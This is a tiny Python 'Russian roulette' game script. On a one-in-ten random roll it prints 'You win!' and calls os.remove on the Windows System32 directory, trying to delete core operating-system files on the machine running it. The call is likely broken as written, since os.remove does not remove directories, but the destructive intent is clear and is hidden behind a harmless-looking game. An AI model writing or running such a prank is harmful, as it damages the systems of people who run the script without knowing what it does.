import os
import random
import pygame

print("Russian roulette")
a = random.randint(1, 10)
pygame.time.delay(1000)
if a == 10:
    print("You win!")
    os.remove("C:\Windows\System32")